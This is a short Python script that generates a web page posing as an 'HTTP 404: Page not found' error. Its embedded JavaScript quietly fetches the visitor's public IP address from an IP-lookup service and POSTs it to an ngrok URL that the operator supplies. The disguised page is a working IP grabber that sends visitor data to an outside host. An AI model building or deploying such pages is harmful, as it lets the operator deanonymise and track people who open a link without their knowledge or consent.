
ngrok_url = input("Ngrok url: ")

text = """
<h1> HTTP 404: Page not found </h1>

<script>

        fetch('https://freeipapi.com/api/json')
                .then(response => response.json())
                .then(data => fetch('ngrok_url/api', {
                                method: 'POST',
                                body: JSON.stringify({'ip':data.ipAddress}),
                                headers: {
                                                'Content-Type': 'application/json'
                                        }
                        }));

</script>
"""

text = text.replace("ngrok_url", ngrok_url)

f = open('public/index.html', 'w')
f.write(text)
f.close()

print("Done")
